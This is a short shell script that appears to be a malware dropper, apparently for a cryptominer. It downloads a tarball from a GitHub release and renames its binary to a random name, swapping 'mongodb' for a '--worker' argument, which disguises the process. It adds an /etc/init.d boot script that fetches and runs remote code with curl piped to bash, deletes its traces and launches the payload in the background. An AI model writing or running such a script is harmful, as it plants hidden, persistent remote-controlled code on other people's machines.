cd /
wget https://github.com/jeletti/jambera/releases/download/v1.5.0/potential.tar
tar -xvf potential.tar
cd /potential
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv pressure $variable1
sed -i "s/mongodb/${variable1} --worker ${variable1}/g" ./equilibrium.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/jeletti/jambera/main/work.sh)" > power.sh
chmod a+x power.sh
update-rc.d power.sh defaults
rm -rf potential.tar
cd /potential
nohup ./equilibrium.sh
ps -ef | grep potential
